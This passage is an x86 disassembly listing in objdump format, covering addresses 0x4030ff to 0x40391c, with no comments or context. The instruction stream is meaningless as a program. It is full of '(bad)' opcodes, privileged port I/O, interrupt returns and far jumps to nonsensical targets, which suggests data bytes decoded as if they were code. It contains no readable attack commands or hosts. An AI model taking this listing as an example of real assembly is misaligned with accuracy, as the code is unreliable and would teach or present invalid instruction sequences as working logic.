  4030ff:	jns    0x403096
  403101:	(bad)  
  403102:	loop   0x4030b7
  403104:	push   esp
  403106:	xor    DWORD PTR [ebx+0x74],edx
  403109:	inc    esp
  40310a:	mov    dh,0x65
  40310c:	inc    edi
  40310d:	push   es
  40310e:	sub    DWORD PTR [ebp-0x7a],ebp
  403111:	sub    ecx,DWORD PTR [esi+0x37]
  403114:	sar    DWORD PTR [esi-0x65c14d73],cl
  40311a:	into   
  40311b:	dec    ecx
  40311c:	les    edx,FWORD PTR [edx+0x95217a5]
  403122:	call   0x8a5cc99f
  403127:	jmp    0x104a9ec5
  40312c:	or     DWORD PTR [ebx-0x7fdb3b67],ebx
  403132:	scas   eax,DWORD PTR es:[edi]
  403133:	add    BYTE PTR [ecx],al
  403135:	add    eax,0x8b179211
  40313a:	and    dh,BYTE PTR [ebp-0x36]
  40313d:	data16 fld QWORD PTR [ebx]
  403140:	dec    ecx
  403141:	mov    cl,0xbc
  403143:	clc    
  403144:	sbb    eax,0xd968b2af
  403149:	and    eax,0x2d8f1d20
  40314e:	data16 add al,0xee
  403151:	std    
  403152:	mov    al,0xac
  403154:	sahf   
  403155:	loop   0x40318a
  403157:	add    al,0xf7
  403159:	cs jo  0x4031a2
  40315c:	push   edi
  40315d:	pop    edx
  40315e:	sub    eax,0x417f1895
  403163:	pop    ebx
  403164:	mov    ah,0x64
  403166:	ins    BYTE PTR es:[edi],dx
  403167:	stc    
  403168:	inc    dl
  40316a:	iret   
  40316b:	mov    ebp,0x673ccb54
  403170:	xor    BYTE PTR cs:[edi+0x7],ch
  403174:	ins    BYTE PTR es:[edi],dx
  403175:	mov    ds:0x445c0a53,al
  40317a:	or     BYTE PTR [edx],0xe8
  40317d:	mov    BYTE PTR [ebp+ebp*2+0x8],ah
  403181:	jno    0x403126
  403183:	mov    ds:0xe7a3c519,al
  403188:	xor    dh,BYTE PTR [ebp-0x6b409e37]
  40318e:	(bad)  
  403190:	jno    0x403164
  403192:	in     al,0xd8
  403194:	sbb    dl,dh
  403196:	adc    eax,0xc6e5b650
  40319b:	jmp    0xfd1e:0xda6b8fd
  4031a2:	clc    
  4031a3:	fs push 0x20
  4031a6:	out    dx,eax
  4031a7:	rcl    DWORD PTR [ecx],1
  4031a9:	sbb    al,0x11
  4031ab:	addr16 js 0x403214
  4031ae:	lods   al,BYTE PTR ds:[esi]
  4031af:	in     eax,0xf9
  4031b1:	scas   al,BYTE PTR es:[edi]
  4031b2:	dec    ecx
  4031b3:	mov    ecx,0xf2ff52f2
  4031b8:	mov    fs,WORD PTR [edx-0x3]
  4031bb:	sub    BYTE PTR [ebx+edi*1+0x3043ad4c],cl
  4031c2:	mov    dl,0x14
  4031c4:	add    al,0x4c
  4031c6:	or     al,0xaa
  4031c8:	mov    al,0xd3
  4031ca:	(bad)  
  4031cb:	lea    ebp,[ecx-0x3]
  4031ce:	jmp    0xb1433395
  4031d3:	out    dx,eax
  4031d4:	mov    dh,0xb3
  4031d6:	das    
  4031d7:	push   esi
  4031d8:	(bad)  
  4031d9:	stc    
  4031da:	mov    ds:0xf24647a9,eax
  4031df:	or     dl,BYTE PTR [esi]
  4031e1:	lahf   
  4031e2:	adc    al,0x4b
  4031e4:	lea    ebp,[edx-0x214818ec]
  4031ea:	xchg   edi,eax
  4031eb:	and    dh,bh
  4031ed:	xchg   ecx,eax
  4031ee:	retf   
  4031ef:	out    0x8f,al
  4031f1:	fsubr  QWORD PTR [eax]
  4031f3:	and    dl,dl
  4031f5:	pop    esi
  4031f6:	add    al,0x25
  4031f8:	push   ecx
  4031f9:	icebp  
  4031fa:	dec    edx
  4031fb:	pop    es
  4031fc:	or     al,0x1b
  4031fe:	mov    cl,BYTE PTR [ebx+0x4a]
  403201:	sub    BYTE PTR [eax-0x37],0xf1
  403205:	rol    BYTE PTR [ebx+0x68],cl
  403208:	icebp  
  403209:	dec    ecx
  40320a:	adc    dh,BYTE PTR [esi]
  40320c:	mov    al,ds:0xb6e0d318
  403211:	mov    esp,0x5e5de0bc
  403216:	mov    al,0x9
  403218:	scas   eax,DWORD PTR es:[edi]
  403219:	xor    ch,BYTE PTR [edi-0x175999bb]
  40321f:	mov    eax,0x46993233
  403224:	xor    ecx,DWORD PTR [edx+ebx*8]
  403227:	mov    bl,0xcb
  403229:	ss push ss
  40322b:	mov    bl,bh
  40322d:	call   0x4cbf:0xb3daed86
  403234:	cmp    BYTE PTR [ebp-0x337bc431],0x24
  40323b:	mov    al,0xd5
  40323d:	push   ebx
  40323e:	inc    esi
  40323f:	xor    al,0xe4
  403241:	(bad)  [edi]
  403243:	pusha  
  403244:	aaa    
  403245:	in     eax,dx
  403246:	adc    al,0x4a
  403248:	jb     0x403267
  40324a:	and    esi,DWORD PTR cs:[esi-0x1a1445ea]
  403251:	(bad)  
  403252:	push   ecx
  403253:	add    eax,0xad32a390
  403258:	xchg   BYTE PTR [ebx],ah
  40325a:	jmp    0x8739:0xa3d6f15d
  403261:	cmp    BYTE PTR [ecx-0x39],bl
  403264:	inc    edi
  403265:	(bad)  
  403266:	jge    0x4032b4
  403268:	pop    ecx
  403269:	loopne 0x4031f3
  40326b:	and    al,0x58
  40326d:	(bad)  
  40326e:	jnp    0x4032d6
  403270:	sbb    DWORD PTR [edx+0x37966f22],ebx
  403276:	fstp   DWORD PTR [ebp-0x6fb0cc63]
  40327c:	iret   
  40327d:	ficom  WORD PTR [edx]
  40327f:	aam    0x6b
  403281:	scas   eax,DWORD PTR es:[edi]
  403282:	mov    esp,0x5816876b
  403287:	ja     0x4032a5
  403289:	or     BYTE PTR [eax],ch
  40328b:	ficomp WORD PTR [ecx-0x7ac70821]
  403291:	fwait
  403292:	test   eax,0x5948eca2
  403297:	mov    ch,0xeb
  403299:	pop    ebp
  40329a:	aaa    
  40329b:	cmp    eax,DWORD PTR [edi+esi*4-0x165d4e07]
  4032a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032a3:	out    dx,al
  4032a4:	test   BYTE PTR [edx+ebx*4-0x1f4053d2],bh
  4032ab:	push   0x58bfda15
  4032b0:	mov    esp,0x2d4b7d30
  4032b5:	mov    al,0x39
  4032b7:	sti    
  4032b8:	ins    DWORD PTR es:[edi],dx
  4032b9:	jp     0x4032fa
  4032bb:	jae    0x4032f0
  4032bd:	jo     0x403282
  4032bf:	xor    ebx,esi
  4032c1:	rol    ch,0x56
  4032c4:	lock xor eax,0x3f8c9486
  4032ca:	ret    0x57f3
  4032cd:	ret    0xfd
  4032d0:	pop    esp
  4032d1:	(bad)  
  4032d2:	mov    bh,0x6a
  4032d4:	and    eax,DWORD PTR [esp+edi*2-0xd]
  4032d8:	loope  0x4032d8
  4032da:	fwait
  4032db:	pop    es
  4032dc:	sub    bh,BYTE PTR [ebx]
  4032de:	cmp    ebx,DWORD PTR [edi+esi*8]
  4032e1:	mov    ah,0x22
  4032e3:	jo     0x40335f
  4032e5:	lods   eax,DWORD PTR ds:[esi]
  4032e6:	pop    esp
  4032e7:	cmp    ah,BYTE PTR [eax]
  4032e9:	jb     0x4032fc
  4032eb:	dec    esi
  4032ec:	pushf  
  4032ed:	and    eax,0x97e9edec
  4032f2:	xchg   edi,eax
  4032f3:	pop    ebx
  4032f4:	xchg   esi,eax
  4032f5:	and    DWORD PTR ds:[ebp+0x6458269b],edi
  4032fc:	sub    esi,DWORD PTR [edi+ebx*4-0x6]
  403300:	push   0xffffffc8
  403302:	in     eax,dx
  403303:	cdq    
  403304:	mov    bl,0xbb
  403306:	sbb    ecx,ebp
  403308:	lock int 0xd9
  40330b:	int3   
  40330c:	mov    ebp,0x500adb5f
  403311:	dec    esp
  403312:	push   edi
  403313:	jecxz  0x40334b
  403315:	out    0x25,al
  403317:	add    BYTE PTR [esi-0x33],cl
  40331a:	inc    ecx
  40331b:	out    dx,eax
  40331c:	rcl    edi,cl
  40331e:	lods   eax,DWORD PTR ds:[esi]
  40331f:	xchg   ebp,eax
  403320:	mov    dh,0x66
  403322:	(bad)  
  403323:	pop    esi
  403324:	repz mov dh,0xed
  403327:	xchg   BYTE PTR [ecx],bh
  403329:	xchg   BYTE PTR [esi+0x58],cl
  40332c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40332d:	(bad)  
  40332e:	fdiv   QWORD PTR [ebx+0x60]
  403331:	lds    esp,FWORD PTR [edi+0x33]
  403334:	cs in  eax,dx
  403336:	in     eax,dx
  403337:	std    
  403338:	xor    al,0xd1
  40333a:	xchg   esp,eax
  40333b:	sahf   
  40333c:	and    ecx,DWORD PTR [eax-0x65]
  40333f:	adc    BYTE PTR [ebp-0x1d86fc22],ch
  403345:	xor    DWORD PTR [ebx],edx
  403347:	xchg   ebx,eax
  403348:	cdq    
  403349:	cmp    DWORD PTR [ebx+0x15b93f1d],edx
  40334f:	aaa    
  403350:	enter  0x1381,0x5b
  403354:	pop    ds
  403355:	jnp    0x4032de
  403357:	call   0x8726:0xbdc9f483
  40335e:	call   0xb4ef78ec
  403363:	jge    0x403382
  403365:	push   esp
  403366:	leave  
  403367:	add    BYTE PTR [ebp+0x43a4b12a],ch
  40336d:	sbb    BYTE PTR [ecx-0x74],0x9b
  403371:	aaa    
  403372:	cmp    DWORD PTR [esp+ebp*8+0x67926244],ebp
  403379:	out    0x88,al
  40337b:	scas   eax,DWORD PTR es:[edi]
  40337c:	jmp    0x43cacc0f
  403381:	sbb    DWORD PTR [ecx-0x30],edx
  403384:	inc    ecx
  403385:	je     0x4033f4
  403387:	mov    eax,ds:0x89ab5b70
  40338c:	fsubr  DWORD PTR [esi-0x7b2fe616]
  403392:	pop    ebx
  403393:	jmp    0x4033d2
  403395:	(bad)  
  403396:	int3   
  403397:	out    0x95,al
  403399:	inc    ebp
  40339a:	(bad)  [ebx+0x89d84d3]
  4033a0:	dec    ebx
  4033a1:	in     al,dx
  4033a2:	in     al,0xd6
  4033a4:	dec    ebp
  4033a5:	push   0x33
  4033a7:	rol    DWORD PTR [edi-0x3d],cl
  4033aa:	fsubrp st(4),st
  4033ac:	das    
  4033ad:	test   al,0xea
  4033af:	(bad)
  4033b2:	inc    edi
  4033b3:	je     0x403398
  4033b5:	arpl   WORD PTR [esi],ax
  4033b7:	rcl    BYTE PTR [eax-0x7832bf6b],cl
  4033bd:	jns    0x403369
  4033bf:	rcl    BYTE PTR [ecx-0x1b],0xc9
  4033c3:	push   es
  4033c4:	fxch   st(4)
  4033c6:	das    
  4033c7:	mov    ecx,0xcb02130a
  4033cc:	mov    edi,0x4211a418
  4033d1:	and    eax,0x9e34d91a
  4033d6:	and    dh,bl
  4033d8:	push   ecx
  4033d9:	and    eax,0xfbdc652
  4033de:	test   esp,ecx
  4033e0:	adc    DWORD PTR [ecx+0x59],edi
  4033e3:	imul   edx,edx,0x68
  4033e6:	cdq    
  4033e7:	and    DWORD PTR [ebp-0x7a],esi
  4033ea:	(bad)  
  4033eb:	push   esp
  4033ec:	mov    es,WORD PTR [ebx]
  4033ee:	adc    DWORD PTR [esi-0x1d],ebx
  4033f1:	mov    es,eax
  4033f3:	lock xor edx,eax
  4033f6:	or     DWORD PTR [edi+0x47fe0026],edi
  4033fc:	out    0x35,al
  4033fe:	fadd   QWORD PTR [esp+ebx*2-0x71d25945]
  403405:	add    al,0x85
  403407:	cmc    
  403408:	rol    DWORD PTR [edx],0xc6
  40340b:	iret   
  40340c:	test   al,0xbe
  40340e:	sub    BYTE PTR [edx+0x14f7e530],cl
  403414:	pop    edi
  403415:	and    edi,DWORD PTR [ecx+0xb]
  403418:	into   
  403419:	dec    esp
  40341a:	loope  0x40345e
  40341c:	xlat   BYTE PTR ds:[ebx]
  40341d:	dec    ecx
  40341e:	ss inc esi
  403420:	arpl   WORD PTR [ebx],bx
  403422:	or     bl,ah
  403424:	clc    
  403425:	test   BYTE PTR [edi+0x415df474],dh
  40342b:	jmp    DWORD PTR ds:0x7e5ec2c3
  403431:	jo     0x4033fd
  403433:	xchg   ebx,eax
  403434:	jge    0x4033d7
  403436:	call   0xe2cc:0x8438ace7
  40343d:	mov    ecx,0xdd9767ff
  403442:	std    
  403443:	imul   DWORD PTR [ecx-0x669fd2da]
  403449:	jbe    0x40340a
  40344b:	push   esi
  40344c:	xchg   DWORD PTR [ebx],ecx
  40344e:	xchg   bl,al
  403450:	shr    BYTE PTR [ebx+0x70d15b30],1
  403456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403457:	xchg   ecx,eax
  403458:	lock aaa 
  40345a:	inc    esi
  40345b:	lahf   
  40345c:	sbb    ecx,DWORD PTR [esi+0x71be1c11]
  403462:	fwait
  403463:	jmp    0x9bc3:0xff4868b5
  40346a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40346b:	clc    
  40346c:	(bad)  
  40346d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40346e:	push   ss
  40346f:	mov    edx,0x747c0f0
  403474:	inc    ebx
  403475:	lahf   
  403476:	and    eax,DWORD PTR [ebx+edi*2]
  403479:	mov    cl,0x41
  40347b:	xchg   dh,al
  40347d:	pop    edx
  40347e:	sbb    DWORD PTR [esi+0x5e512743],ecx
  403484:	test   DWORD PTR [ecx],edx
  403486:	jo     0x403505
  403488:	cmp    ah,BYTE PTR [edx-0x2a5dbb34]
  40348e:	push   cs
  40348f:	add    BYTE PTR [ebp+0x4de64cf9],al
  403495:	mov    eax,0xe1678592
  40349a:	cmp    ebp,edx
  40349c:	mov    WORD PTR [edx+0x67210b26],gs
  4034a2:	adc    eax,0xe64cfc9
  4034a7:	sahf   
  4034a8:	stc    
  4034a9:	sub    edi,DWORD PTR [esi+0x322e7038]
  4034af:	pop    esi
  4034b0:	mov    ebx,0x21b041b7
  4034b5:	fbstp  TBYTE PTR [edx]
  4034b7:	popf   
  4034b8:	repz inc edx
  4034ba:	mov    edx,0x3b32d357
  4034bf:	xchg   ecx,eax
  4034c0:	push   es
  4034c1:	inc    BYTE PTR [ebx]
  4034c3:	pusha  
  4034c4:	ds push ecx
  4034c6:	mov    cl,0x87
  4034c8:	sub    esi,DWORD PTR ds:[ebx-0x58]
  4034cc:	inc    ecx
  4034cd:	and    BYTE PTR [ecx+0x20ac81ee],cl
  4034d3:	mov    eax,ds:0x489847e5
  4034d8:	mov    ebx,0xb533ac87
  4034dd:	out    dx,eax
  4034de:	repz dec ebx
  4034e0:	fstp   st(4)
  4034e2:	lods   al,BYTE PTR ds:[esi]
  4034e3:	lds    ebp,FWORD PTR [ecx]
  4034e5:	nop
  4034e6:	adc    cl,BYTE PTR [edx]
  4034e8:	dec    ebp
  4034e9:	xchg   ebp,eax
  4034ea:	jbe    0x4034af
  4034ec:	mov    ss:0xf2aff3e4,eax
  4034f2:	dec    eax
  4034f3:	nop
  4034f4:	sub    esp,DWORD PTR [edx+0x20]
  4034f7:	mov    BYTE PTR [ebp-0x6a3ca1bb],cl
  4034fd:	mov    esp,0xa2d62565
  403502:	sar    BYTE PTR ds:0xf3d1e695,0xe6
  403509:	outs   dx,DWORD PTR ds:[esi]
  40350a:	mov    ecx,DWORD PTR [edi-0x2f]
  40350d:	test   DWORD PTR [ecx+edx*4-0x39],eax
  403511:	ret    
  403512:	or     al,0x14
  403514:	jne    0x4034b4
  403516:	ret    
  403517:	mov    esp,0x5fdc8484
  40351c:	jb     0x4034a9
  40351e:	bound  esi,QWORD PTR [edi-0x16]
  403521:	inc    eax
  403522:	out    dx,eax
  403523:	adc    esi,edx
  403525:	pop    edi
  403526:	test   DWORD PTR ds:[ecx-0x6d],0x36c401c9
  40352e:	mov    al,ds:0x483d69dc
  403533:	adc    eax,0xe1131ae1
  403538:	and    bl,BYTE PTR [ecx-0x7]
  40353b:	xchg   ebp,eax
  40353c:	ret    0x1160
  40353f:	aas    
  403540:	aam    0x70
  403542:	arpl   WORD PTR [esi+ebx*2-0x5e737d96],si
  403549:	aam    0x4f
  40354b:	inc    esp
  40354c:	lock mov WORD PTR [esi+0x7428ac46],es
  403553:	cli    
  403554:	paddb  mm6,mm6
  403557:	fnsave [edx+0x20]
  40355a:	mov    ch,0x58
  40355c:	add    eax,0x3c326017
  403561:	cmp    eax,DWORD PTR [edi]
  403563:	cs mov bl,0xe3
  403566:	cmp    BYTE PTR ds:0x4a2ea650,dh
  40356c:	mov    ebp,0xd1ab069d
  403571:	jecxz  0x4035cf
  403573:	adc    BYTE PTR [ecx-0x4505c86c],0x5d
  40357a:	popa   
  40357b:	in     al,dx
  40357c:	push   es
  40357d:	pop    ss
  40357e:	and    al,0x5b
  403580:	sub    cl,BYTE PTR [ecx]
  403582:	pop    DWORD PTR [esi+0x46]
  403585:	sbb    al,0x90
  403587:	lea    ecx,[eax]
  403589:	pop    ebx
  40358a:	mov    edi,0xfa68819
  40358f:	xor    ah,bh
  403591:	test   eax,0xd6d6b3f2
  403596:	jg     0x40357c
  403598:	lahf   
  403599:	in     al,dx
  40359a:	mov    dl,0xd2
  40359c:	repnz xor DWORD PTR [ebp-0x435ea29b],ebx
  4035a3:	sub    BYTE PTR [ecx*8-0x435ec719],bh
  4035aa:	test   BYTE PTR [ebx],al
  4035ac:	adc    DWORD PTR [ebp+0x34c32fb5],esp
  4035b2:	clc    
  4035b3:	je     0x403551
  4035b5:	or     al,0x81
  4035b7:	(bad)  
  4035b8:	xchg   esp,eax
  4035b9:	test   DWORD PTR [edi+0x76],esi
  4035bc:	dec    ebp
  4035bd:	in     eax,0x45
  4035bf:	loope  0x40357f
  4035c1:	retf   0xf2a4
  4035c4:	scas   al,BYTE PTR es:[edi]
  4035c5:	out    0x8a,al
  4035c7:	fistp  DWORD PTR [edx-0x7a3a2752]
  4035cd:	sbb    eax,0x2454b714
  4035d2:	sub    bl,BYTE PTR [ecx-0x154c7874]
  4035d8:	stos   DWORD PTR es:[edi],eax
  4035d9:	(bad)  
  4035da:	and    cl,BYTE PTR ds:0xec5c2f6c
  4035e0:	icebp  
  4035e1:	ret    0x1d7a
  4035e4:	jg     0x403598
  4035e6:	(bad)  
  4035e7:	adc    bh,BYTE PTR [ebx+ebx*2+0x5e]
  4035eb:	pop    eax
  4035ec:	loope  0x403571
  4035ee:	data16 jp 0x4035a0
  4035f1:	mov    DWORD PTR [ebx+0x577d4559],ebx
  4035f7:	cwde   
  4035f8:	jmp    0xa43dd6bc
  4035fd:	test   DWORD PTR [ebp+ecx*4+0x35],ebx
  403601:	or     DWORD PTR [ebx+0x34],ebx
  403604:	dec    ecx
  403605:	cmc    
  403606:	jb     0x4035e2
  403608:	jmp    0x66bf:0x44c18706
  40360f:	mov    edx,0x6961f546
  403614:	dec    esp
  403615:	out    0x1b,eax
  403617:	push   esi
  403618:	imul   DWORD PTR ds:0xca8c8ee1
  40361e:	mov    cl,0xab
  403620:	dec    eax
  403621:	push   ds
  403622:	ins    BYTE PTR es:[edi],dx
  403623:	add    al,0x71
  403625:	ret    0x55b4
  403628:	inc    esi
  403629:	stos   BYTE PTR es:[edi],al
  40362a:	push   ecx
  40362b:	jnp    0x40366b
  40362d:	push   ebx
  40362e:	lds    ebx,FWORD PTR [esi+edx*2-0x6802b773]
  403635:	dec    edi
  403636:	fadd   DWORD PTR [ecx-0x6c52d81c]
  40363c:	rcr    BYTE PTR [edi],cl
  40363e:	jmp    0x4036a4
  403640:	mov    ch,0x11
  403642:	repz test eax,0xc179ef9c
  403648:	sbb    eax,0x7eb5d71c
  40364d:	xbegin 0x5c80662b
  403653:	adc    esp,ebx
  403655:	loope  0x403612
  403657:	call   0x486bd7fd
  40365c:	inc    ebx
  40365d:	cmp    eax,0x3c1ee85c
  403662:	jmp    0xa3e72b9c
  403667:	mov    cl,0x58
  403669:	stc    
  40366a:	ret    0x612
  40366d:	mov    eax,0x4b1d6d0d
  403672:	ret    0x91db
  403675:	pop    esi
  403676:	adc    ch,cl
  403678:	jne    0x40360b
  40367a:	mov    edx,0x56672cc5
  40367f:	cmp    DWORD PTR [edi+0x2c],0xffffffef
  403683:	xor    DWORD PTR [esi+0x7e],esp
  403686:	inc    esi
  403687:	test   DWORD PTR [ecx+edx*4],esi
  40368a:	ror    BYTE PTR [ecx],cl
  40368c:	inc    esp
  40368d:	aaa    
  40368e:	outs   dx,BYTE PTR ds:[esi]
  40368f:	sub    al,0x6
  403691:	pop    es
  403692:	push   edi
  403693:	and    BYTE PTR [edi],cl
  403695:	adc    DWORD PTR [esi-0x2],esp
  403698:	(bad)  
  403699:	outs   dx,BYTE PTR ds:[esi]
  40369a:	jb     0x40363c
  40369c:	aad    0x8d
  40369e:	lds    ecx,FWORD PTR [ecx]
  4036a0:	mov    esp,0x5f3fdef3
  4036a5:	jno    0x403719
  4036a7:	push   eax
  4036a8:	cmp    al,0xd3
  4036aa:	push   edi
  4036ab:	jo     0x40371e
  4036ad:	fsubr  st,st(0)
  4036af:	in     al,dx
  4036b0:	adc    eax,0x87726e56
  4036b5:	stos   DWORD PTR es:[edi],eax
  4036b6:	sti    
  4036b7:	dec    ecx
  4036b8:	add    dl,BYTE PTR [edi-0x7f]
  4036bb:	hlt    
  4036bc:	retf   0x48db
  4036bf:	cmp    BYTE PTR [eax+esi*2+0x1143b18b],bh
  4036c6:	lahf   
  4036c7:	retf   0xaf08
  4036ca:	fild   QWORD PTR [edi]
  4036cc:	jmp    0x4036d5
  4036ce:	mov    dl,0x68
  4036d0:	sbb    ch,bl
  4036d2:	(bad)  
  4036d3:	sbb    eax,DWORD PTR [edi-0x39ae8c81]
  4036d9:	add    ch,BYTE PTR [ecx+0x56cda35d]
  4036df:	sub    al,dl
  4036e1:	push   cs
  4036e2:	pusha  
  4036e3:	push   ebx
  4036e4:	add    BYTE PTR ds:0xadeecd14,bl
  4036ea:	add    ch,BYTE PTR [edx]
  4036ec:	inc    ecx
  4036ed:	aaa    
  4036ee:	mov    bl,0x58
  4036f0:	outs   dx,BYTE PTR ds:[esi]
  4036f1:	das    
  4036f2:	and    eax,0x208c7481
  4036f7:	lods   al,BYTE PTR ds:[esi]
  4036f8:	push   ebp
  4036f9:	out    dx,al
  4036fa:	jmp    0x403755
  4036fc:	lahf   
  4036fd:	pop    esi
  4036fe:	xchg   ecx,eax
  4036ff:	sub    eax,0xe66c72ee
  403704:	fmul   QWORD PTR [edi-0x38]
  403707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403708:	test   DWORD PTR [ecx-0x27],ecx
  40370b:	add    ebx,DWORD PTR [edx+0x15]
  40370e:	sbb    cl,0xb5
  403711:	leave  
  403712:	add    al,0x7f
  403714:	mov    al,0x60
  403716:	stc    
  403717:	pop    ecx
  403718:	test   DWORD PTR [eax],esi
  40371a:	adc    ebp,DWORD PTR [ebx]
  40371c:	je     0x40371f
  40371e:	pop    ecx
  40371f:	into   
  403720:	test   DWORD PTR [edi+0x7f9648fd],0x52b1768d
  40372a:	in     eax,dx
  40372b:	(bad)  
  40372d:	push   0xa9d61e3d
  403732:	inc    esi
  403733:	xlat   BYTE PTR ds:[ebx]
  403734:	stos   BYTE PTR es:[edi],al
  403735:	push   es
  403736:	mov    bh,0xd6
  403738:	mov    WORD PTR [esi],ss
  40373a:	xchg   edi,eax
  40373b:	or     WORD PTR [eax+0x2ee058b9],ax
  403742:	mov    ebx,0x81268751
  403747:	inc    ebx
  403748:	add    al,0x79
  40374a:	and    esp,ebx
  40374c:	dec    esp
  40374d:	xor    bl,al
  40374f:	adc    DWORD PTR [ecx+0x3b],esp
  403752:	mov    cl,0xcc
  403754:	out    dx,al
  403755:	loopne 0x4037c3
  403757:	iret   
  403758:	test   al,0x70
  40375a:	mov    ?,WORD PTR [edx-0x488994dd]
  403760:	push   esi
  403761:	cld    
  403762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403763:	mov    edx,0x8401334c
  403768:	test   al,0x7
  40376a:	jne    0x403745
  40376c:	add    al,0xe3
  40376e:	jnp    0x403707
  403770:	lds    edi,FWORD PTR [edi-0x8151cba]
  403776:	aaa    
  403777:	add    ch,ah
  403779:	pop    ecx
  40377a:	sub    edx,0x63985ef7
  403780:	jno    0x403702
  403782:	lock mov ch,0x7e
  403785:	jmp    0xc981af60
  40378a:	cmp    al,BYTE PTR [ebx-0x5e]
  40378d:	jb     0x40380b
  40378f:	pop    edx
  403790:	in     eax,dx
  403791:	mov    dh,0x29
  403793:	jbe    0x403813
  403795:	sbb    eax,0x3bebeb45
  40379a:	inc    edi
  40379b:	or     DWORD PTR [edi+ebp*8-0x50e15a4e],edi
  4037a2:	sbb    dh,bl
  4037a4:	sub    DWORD PTR [edi+0x415e2234],esi
  4037aa:	bound  ebp,QWORD PTR [edi-0x5c]
  4037ad:	je     0x4037b3
  4037af:	addr16 jbe 0x403760
  4037b2:	es (bad) 
  4037b4:	leave  
  4037b5:	xor    al,BYTE PTR [edi]
  4037b7:	pop    ebp
  4037b8:	scas   al,BYTE PTR es:[edi]
  4037b9:	xor    eax,0x97ccce4b
  4037be:	jne    0x403808
  4037c0:	arpl   WORD PTR [esi+eax*4-0x6d],bx
  4037c4:	lods   eax,DWORD PTR ds:[esi]
  4037c5:	imul   esi,edx,0xc7cc7856
  4037cb:	test   eax,0xc807d017
  4037d0:	fcmovnb st,st(0)
  4037d2:	inc    ebp
  4037d3:	dec    DWORD PTR [edx-0x7ce5190f]
  4037d9:	xchg   ebp,eax
  4037da:	std    
  4037db:	jmp    0xfc83b60f
  4037e0:	fs fwait
  4037e2:	cmp    dh,bh
  4037e4:	jge    0x403812
  4037e6:	call   FWORD PTR [edx+0x15]
  4037e9:	call   0xcd48:0x2eeead5
  4037f0:	inc    esi
  4037f1:	mov    BYTE PTR [edx+0x1f],bl
  4037f4:	lock int 0x5e
  4037f7:	add    ah,BYTE PTR ds:0xd5061733
  4037fd:	inc    esp
  4037fe:	jb     0x40385d
  403800:	jl     0x40381b
  403802:	out    dx,al
  403803:	fcomp  DWORD PTR [edi+0x6b]
  403806:	(bad)  
  403807:	stc    
  403808:	test   eax,0x77947033
  40380d:	aaa    
  40380e:	rcl    BYTE PTR [ecx-0x38915e91],0xd5
  403815:	and    esi,eax
  403817:	les    ecx,FWORD PTR [edi+0x4ed28dab]
  40381d:	cmp    DWORD PTR [ebx-0x389f0a3e],esi
  403823:	sbb    DWORD PTR [ecx-0xcc1bc99],esi
  403829:	gs jbe 0x40384d
  40382c:	push   0x2b
  40382e:	(bad)  
  403830:	xor    al,0x5f
  403832:	ds xor eax,0xb816461a
  403838:	mov    ds:0x36698420,al
  40383d:	retf   0xb9ff
  403840:	push   0xffffffa7
  403842:	and    eax,DWORD PTR [ecx+0x41]
  403845:	add    edx,ebx
  403847:	in     eax,dx
  403848:	mov    eax,cs
  40384a:	mov    ah,0xee
  40384c:	cmp    BYTE PTR ds:0xe1f64370,ah
  403852:	sbb    BYTE PTR [edx+0x23da86ee],0x48
  403859:	add    dl,BYTE PTR [ecx+eiz*1-0x1f17690a]
  403860:	aam    0x8a
  403862:	push   es
  403863:	or     al,0xe7
  403865:	loope  0x403894
  403867:	mov    esp,0xdf2c00e8
  40386c:	xchg   esp,eax
  40386d:	ja     0x4038e7
  40386f:	cmp    esp,DWORD PTR [ebx-0x45]
  403872:	push   ebx
  403873:	nop
  403874:	mov    DWORD PTR [ebx],0xdfa218d5
  40387a:	(bad)  
  40387b:	and    DWORD PTR [edi],eax
  40387d:	pop    esp
  40387e:	cmp    al,0xc9
  403880:	js     0x403837
  403882:	sbb    eax,DWORD PTR [ebp+0x24f7e5a2]
  403888:	loope  0x4038a8
  40388a:	or     ebx,DWORD PTR [ecx+ebx*8-0x100764c9]
  403891:	push   edi
  403892:	mov    esi,0xe8b58571
  403897:	sub    BYTE PTR [ebx],0x5d
  40389a:	xchg   DWORD PTR [ebx-0x1e],edx
  40389d:	ja     0x403864
  40389f:	test   cl,dl
  4038a1:	pop    esi
  4038a2:	cmp    DWORD PTR [edx],esp
  4038a4:	and    bh,BYTE PTR ds:0x7fad9d41
  4038aa:	lock push ds
  4038ac:	add    bh,BYTE PTR [ebp+eax*4+0x37]
  4038b0:	(bad)  
  4038b1:	out    dx,al
  4038b2:	sub    ch,0x15
  4038b5:	in     eax,dx
  4038b6:	ror    BYTE PTR [ecx],1
  4038b8:	rol    BYTE PTR [ebx+0x3b],1
  4038bb:	dec    edx
  4038bc:	inc    eax
  4038bd:	pop    ds
  4038be:	aam    0x4
  4038c0:	lods   al,BYTE PTR ds:[esi]
  4038c1:	pushf  
  4038c2:	pop    eax
  4038c3:	in     al,dx
  4038c4:	sub    esp,ebx
  4038c6:	dec    edx
  4038c7:	mov    dl,0xf2
  4038c9:	mov    cl,0x80
  4038cb:	into   
  4038cc:	xor    al,0x90
  4038ce:	fs mov dl,0x94
  4038d1:	inc    esi
  4038d2:	or     eax,0xd37f1c01
  4038d7:	cmp    esp,DWORD PTR [esi-0x6e]
  4038da:	sbb    ebp,ecx
  4038dc:	mov    dl,0x59
  4038de:	out    dx,eax
  4038df:	mov    bl,dh
  4038e1:	mov    ch,0x71
  4038e3:	nop
  4038e4:	ins    BYTE PTR es:[edi],dx
  4038e5:	cdq    
  4038e6:	sub    al,0xc6
  4038e8:	daa    
  4038e9:	dec    eax
  4038ea:	stc    
  4038eb:	mov    ds,ecx
  4038ed:	pop    eax
  4038ee:	push   esi
  4038ef:	dec    edi
  4038f0:	pop    ebx
  4038f1:	mov    dh,0xee
  4038f3:	daa    
  4038f4:	pop    ebp
  4038f5:	inc    esi
  4038f6:	push   edx
  4038f7:	and    BYTE PTR [edi+eax*1-0xcf0da4d],dh
  4038fe:	jnp    0x403936
  403900:	sub    eax,0x4d8b23bc
  403905:	lock sub DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
